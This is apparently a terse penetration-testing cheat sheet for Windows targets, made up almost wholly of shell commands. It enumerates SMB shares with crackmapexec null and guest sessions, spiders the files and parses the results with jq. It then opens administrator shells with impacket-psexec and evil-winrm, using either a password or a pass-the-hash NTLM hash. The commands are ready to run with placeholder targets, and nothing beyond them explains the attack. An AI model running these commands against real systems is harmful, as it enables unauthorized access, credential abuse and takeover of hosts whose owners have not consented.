Put IP after protocol or the tool crashes!

Add domain NB name to /etc/hosts

```shell
crackmapexec smb $TARGET_IP -u '' -p ''
```

Show all files and DIRs for guest:

```shell
crackmapexec smb $TARGET_IP -u 'guest' -p '' -M spider_plus
```

Parse the JSON from the previous cmd into readable form:

```shell
cat $TARGET_IP.json | jq '. |map_values(keys)'
```

```shell
impacket-psexec administrator@$TARGET_IP
```

```shell
evil-winrm -i $TARGET_IP -u administrator -p $PASSWORD
```

```shell
evil-winrm -i $TARGET_IP -u administrator -H $HASH
```